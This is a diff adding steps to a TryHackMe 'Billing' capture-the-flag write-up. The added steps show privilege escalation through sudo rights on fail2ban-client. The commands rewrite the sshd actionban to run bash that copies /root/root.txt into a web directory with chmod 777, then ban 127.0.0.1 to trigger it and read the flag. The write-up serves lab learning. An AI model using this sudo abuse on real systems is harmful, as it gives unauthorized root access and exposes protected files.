@@ -50,7 +50,22 @@ sudo /usr/bin/fail2ban-client get sshd actions
 ```
 
 Next, we add an action for the `iptables-multiport` to run when an `ip` gets banned on the `sshd` service. This action will be for the binary to read the root.txt file.
+modified the **actionban** rule to **read** `**/root/root.txt**` and store the result in a publicly accessible location:
 
+```
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /var/www/html/mbilling/lib/icepay/root_exposed.txt && chmod 777 /var/www/html/mbilling/lib/icepay/root_exposed.txt'"
+```
+
+To force `fail2ban` to execute the malicious action, I **banned an IP**:
+
+```
+sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
+```
+
+Now that `root.txt` was exposed, I **retrieved the final flag**:
+```
+cat /var/www/html/mbilling/lib/icepay/root_exposed.txt
+```
 ### References
 [TryHackMe | Billing](https://tryhackme.com/room/billing)
 
